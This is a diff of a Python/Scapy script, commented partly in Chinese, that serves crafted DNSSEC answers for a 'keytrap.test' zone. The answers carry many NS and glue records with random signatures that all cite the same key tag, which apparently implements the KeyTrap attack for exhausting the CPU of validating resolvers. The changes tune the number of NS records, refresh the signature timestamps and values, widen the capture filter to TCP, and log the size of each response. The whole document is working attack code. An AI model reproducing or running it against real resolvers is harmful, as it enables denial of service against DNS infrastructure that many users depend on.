@@ -10,17 +10,21 @@ IFACE_LAN = "eth0"
 PORT_OF_SERVER = "53"
 DOMAIN_NAME = ["www.keytrap.test.", "keytrap.test.", "ns1.keytrap.test.", "_ta-75b2.keytrap.test."]
 GLOBAL_TTL = 86400
-INCEPTION = datetime.strptime("20240928101351", "%Y%m%d%H%M%S").timestamp() + 3600 * 8
-EXPIRATION = datetime.strptime("20241028101351", "%Y%m%d%H%M%S").timestamp() + 3600 * 8
 
-BPF_FILTER = "udp port " + PORT_OF_SERVER 
+BPF_FILTER = "udp port "  + str(PORT_OF_SERVER) + " or tcp port " + str(PORT_OF_SERVER)
 
+# NS记录数量
+NS_COUNT = 16
+
+# 每次签名都需要更新以下条目：INCEPTION, EXPIRATION, RRSIG
+INCEPTION = datetime.strptime("20241004101041", "%Y%m%d%H%M%S").timestamp() + 3600 * 8
+EXPIRATION = datetime.strptime("20241103101041", "%Y%m%d%H%M%S").timestamp() + 3600 * 8
 RRSIG={
-    "www.keytrap.test." : base64.b64decode("miPfV54xrE5E5agBhS2jinqxdKflX7g6AXdScbGBAiarZYikQDKRvx2uYUWh+ikSMHQlms+8UmxNcme0xkn2hf4z7gTRSYlPoz29HZWMN3aYzFYWkjcweCB6zcVVsun+"),
-    # RRSIG FOR NS
-    "keytrap.test."     : base64.b64decode("Te5cukUZ4ijYiy/saD5savrKd6PW7K5f+Vz0XfHrAIR4FG3zAag3GplJhW9vS59qCEFYHNn5XabANs3uaH5BUU+aiSMjmMw4/F5OJHJo11hXi3PYR0g5sGL+eiK2tWLp"),
-    "ZSK": base64.b64decode("0rrYEGNp6ZesEserq0qM+fo+xXswWmtYOI1P+1SLmj+FqHqrYzMFtMu13NeRbYzq6dM7zFQoEi4Bw1p7BSUdqguHPRGkggrfIZEdA4EjIEtQHK5TRmVt5kl/gIX8kq8D"),
-    "KSK": base64.b64decode("w/ruTlQ5LrnVOCGsKZbxzXo2DSHVnx6htRCSQTglDR6f6eT8H1TUCMo3pBO+qFC3gcxrJLcFIo02TpcYMcnMTV/7ya7cwcisR10uXGCSDagWhD9gXp7ShWLWwTgnYvUa"),
+    "www.keytrap.test." : base64.b64decode("aTQBkq28NJuzAHhjEwv2OpYkN/2Fv83fi2MSAA3XWyfa09OTLHEc0+1Y91NRkA1IVhqfsgi+SU1Cceiq9z+VNnf6YB0pVLZKc45Wz5R1gO/LrwLbB/Pb9680rtWn37Ru"),
+    # RRSIG FOR NS RRSET
+    "keytrap.test."     : base64.b64decode("qgKHjKqwandJiRf6+Uj0mGl9wucsnTWXrd19c5qQnsJOjmFg4AFndIGb7jU8hlNXOEbtULwmts84Cn9SRSu5P0LKqMZbIt+t1JrN2vreFIg/dYfWpTROqwu7rNn8z570"),
+    "ZSK": base64.b64decode("T3rzVmsLHHZxJvkP/grK98XMyb2EWzPEMpx2qSsEsgaN/VyT4Ey2QWfGV5KAlqdZDyzClWGQxy2b/SNSVP1VLUAMQtqDABapTdR5EBhfHU32ru3XTKAVTTbVTYoPINgz"),
+    "KSK": base64.b64decode("oMc2Felq1PU693DWeQYlSR4PIXj9AorLPzuQZww8aN/huIbIElT3N9lZLB8lqcN1yk/XxJq4eKp0nU8pEyZckQhBMuIu8LU/ywh7w/Z786eZOW4uqfrvAVF3TH8kTWlx"),
 }
 
 # keytag = 6350
@@ -63,7 +67,7 @@ def craft_dns_response(pkt, qname, qtype):
         
         glue_list = []
 
-        for i in range(20):
+        for i in range(NS_COUNT):
             ns_list.append(DNSRR(rrname="keytrap.test.", type=2, ttl=GLOBAL_TTL, rdata=f"ns{i}.keytrap.test."))
             glue_list.append(DNSRR(rrname=f"ns{i}.keytrap.test.", type=1, ttl=GLOBAL_TTL, rdata="124.222.27.40"))
             glue_list.append(DNSRRRSIG(rrname=f"ns{i}.keytrap.test.", labels=3, ttl=GLOBAL_TTL, typecovered=1, originalttl=GLOBAL_TTL, expiration=EXPIRATION, inception=INCEPTION,keytag=6350, algorithm=14, signersname="keytrap.test", signature=gen_random_rrsig()))
@@ -132,6 +136,10 @@ def dns_response(pkt):
         # resp.show2()
         send(resp, iface=IFACE_LAN)
         print(f"{time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())} : to {pkt[IP].src}:{pkt[UDP].sport} : {qname}\n")
+        # 输出构造的回复大小
+        pkt_size = len(resp)
+        print(f"The size of the packet is: {pkt_size} bytes")
+
 
     except Exception as error:
         print("Error: ", error)
